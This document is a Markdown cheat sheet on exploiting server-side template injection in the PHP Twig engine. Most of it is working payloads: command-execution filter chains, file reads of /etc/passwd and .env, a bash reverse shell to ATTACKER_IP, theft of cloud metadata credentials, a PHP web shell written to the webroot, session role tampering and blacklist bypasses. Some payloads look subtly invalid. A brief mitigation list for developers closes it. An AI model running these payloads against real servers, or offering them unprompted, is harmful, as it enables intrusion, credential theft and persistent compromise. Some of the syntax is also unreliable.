## 1. Overview

**Twig** is a popular PHP templating engine used by Symfony and other frameworks. Server-Side Template Injection (SSTI) in Twig occurs when user input is embedded directly into templates without proper sanitization, allowing attackers to execute arbitrary code on the server.

**Key Risks:**

- Remote Code Execution (RCE)
- Information disclosure (environment variables, config files)
- File system access
- Full server compromise

**Common Vulnerable Patterns:**

- `{{ user_input }}` without escaping
- `render()` with unsanitized data
- Dynamic template compilation from user input

---

## 2. Exploitation Methods

### Step 1: Detection

**Basic Detection Payloads:**

```twig
{{7*7}}
{{7*'7'}}
{{'a'.toUpperCase()}}
{{_self}}
```

**Expected Responses:**

- `49` → Vulnerable to math operations
- `7777777` → String multiplication works
- Shows template object → Twig confirmed

**Fuzzing for SSTI:**

```bash
# Using tplmap
./tplmap.py -u 'http://target.com/page?name=John'

# Manual detection
?name={{7*7}}
?name={{_self}}
?name={{dump(app)}}
```

---

### Step 2: Information Gathering

**Extract Twig Environment:**

```twig
{{_self.env}}
{{_self.getTemplateName()}}
{{app}}
{{dump(_context)}}
```

**Symfony Debug Profiler Check:**

```
http://target.com/_profiler/
http://target.com/_profiler/phpinfo
http://target.com/_profiler/open?file=app/config/parameters.yml
```

**Enumerate Variables:**

```twig
{{_self.env.getGlobals()}}
{{dump(_context|keys)}}
```

---

### Step 3: Code Execution

**Method 1: Filter Chains (Most Reliable)**

```twig
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
{{['whoami']|filter('passthru')}}
```

**Method 2: `getFilter()` Abuse**

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**Method 3: `map` Filter**

```twig
{{['id']|map('system')|join}}
{{['cat /etc/passwd']|map('passthru')|join}}
```

**Method 4: Direct Object Access**

```twig
{{_self.env.enableDebug()}}
{{_self.env.setCache(false)}}
```

---

### Step 4: File Operations

**Read Files:**

```twig
{{source('/etc/passwd')}}
{{include('/etc/passwd')}}
{{"<?php echo file_get_contents('/etc/passwd'); ?>"|filter('trim')}}
```

**Write Files (if writable directories exist):**

```twig
{{_self.env.setLoader(_self.env.getLoader())}}
```

---

## 3. Bypasses

### WAF/Filter Evasion

**Bypass Blacklists:**

```twig
# Using string concatenation
{{"sys"|cat:"tem"}}
{{['sy'~'stem']|filter}}

# Encoding
{{"\x73\x79\x73\x74\x65\x6d"}}
{{('system')|reverse|reverse}}

# Using attribute()
{{_self|attr('env')}}
```

**Bypass Sanitization:**

```twig
# If {{}} blocked, try {% %}
{% set cmd = 'id' %}
{% set result = cmd|filter('system') %}

# If filter blocked
{{_self.env.getFilter('sys'~'tem')}}
```

**Whitespace Bypass:**

```twig
{{7*7}}
{{ 7*7 }}
{{7 *7}}
{%set x=7*7%}{{x}}
```

---

## 4. Top 10 Modern Payloads

### 1. **Classic RCE (Filter Chain)**

```twig
{{['id']|filter('system')}}
```

### 2. **Reverse Shell**

```twig
{{['bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"']|filter('system')}}
```

### 3. **Environment Variable Dump**

```twig
{{dump(app.request.server.all)}}
```

### 4. **Read Sensitive Files**

```twig
{{source('/var/www/.env')}}
{{source('config/parameters.yml')}}
```

### 5. **Multi-Command Execution**

```twig
{{['id;whoami;pwd']|map('passthru')|join}}
```

### 6. **Map Filter RCE**

```twig
{{'id'|map('system')|join}}
```

### 7. **Namespace Trick**

```twig
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
```

### 8. **Raw Output Bypass**

```twig
{% set cmd = 'cat /etc/passwd' %}
{% apply spaceless %}{{cmd|filter('system')}}{% endapply %}
```

### 9. **Symfony App Object Access**

```twig
{{app.request.server.get('DOCUMENT_ROOT')}}
{{app.request.headers.get('host')}}
```

### 10. **Conditional Blind SSTI**

```twig
{% if 'system'|filter('id') %}true{% endif %}
```

---

## 5. Higher Impact Scenarios

### Scenario 1: Symfony Debug Mode Enabled

- Access `/_profiler/` for full request history
- Leak tokens, session data, DB credentials
- Use **Symfony Debug Looter**: `https://github.com/synacktiv/eos/`

### Scenario 2: Database Access

```twig
{{dump(app.doctrine.connection.fetchAll('SELECT * FROM users'))}}
```

### Scenario 3: Cloud Metadata Extraction

```twig
{{['curl http://169.254.169.254/latest/meta-data/iam/security-credentials/']|filter('system')}}
```

### Scenario 4: Persistent Backdoor

```twig
{{['echo "<?php system($_GET[c]); ?>" > /var/www/html/shell.php']|filter('system')}}
```

### Scenario 5: Privilege Escalation

```twig
{{['sudo -l']|filter('system')}}
{{['cat /etc/sudoers']|filter('system')}}
```

### Scenario 6: Session Hijacking

```twig
{{dump(app.session.all)}}
{{app.session.set('role', 'admin')}}
```

---

## 6. Mitigations

**For Developers:**

- ✅ Always use `{{ variable|e }}` or `{{ variable|escape }}`
- ✅ Never pass user input directly to `render()` or template compilation
- ✅ Disable Symfony debug mode in production
- ✅ Use Twig Sandbox mode for untrusted templates
- ✅ Validate/sanitize all user input before template rendering
- ✅ Restrict file system access with `open_basedir`
- ✅ Use Content Security Policy (CSP) headers

**For Pentesters:**

- 🔍 Check for `_profiler/` endpoint
- 🔍 Test all GET/POST parameters for SSTI
- 🔍 Look for error messages revealing Twig/Symfony
- 🔍 Try blind SSTI with time-based payloads
- 🔍 Check for file upload → template inclusion chains

---

## Tools & Resources

**Automated Scanners:**

- [tplmap](https://github.com/epinna/tplmap) - SSTI detection & exploitation
- [Symfony Exploits](https://github.com/ambionics/symfony-exploits) - Symfony-specific tools
- [EOS](https://github.com/synacktiv/eos/) - Symfony debug profiler looter

**Manual Testing:**

```bash
# tplmap usage
./tplmap.py -u 'http://target.com/page?name=*' --os-shell

# Burp Suite Intruder payloads
{{7*7}}
{{_self}}
{{dump(app)}}
```

---

🎯 **Pro Tips:**

- Always check `/_profiler/` first
- Use `{{dump()}}` liberally for debugging
- Chain SSTI with file upload for maximum impact
- Look for `render()` in source code during whitebox testing
- Test both `{{}}` and `{% %}` delimiters